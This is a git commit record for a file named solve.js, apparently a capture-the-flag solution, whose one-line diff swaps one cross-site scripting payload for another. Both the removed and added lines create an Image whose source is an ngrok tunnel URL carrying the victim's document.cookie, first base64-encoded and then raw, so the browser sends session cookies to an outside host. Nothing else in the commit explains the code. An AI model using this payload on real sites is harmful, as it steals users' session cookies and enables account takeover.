dcfc34fa79a7e8575a858552c0abbcc59d3a7571
LanceloT <94410620+LaceloTT@users.noreply.github.com>
2024-11-22 20:41:05 -0300

    Update solve.js

--- solve.js
+++ solve.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://15ed-190-114-33-103.ngrok-free.app?data='+btoa(document.cookie);
+new Image().src='https://15ed-190-114-33-103.ngrok-free.app?cookie='+document.cookie;
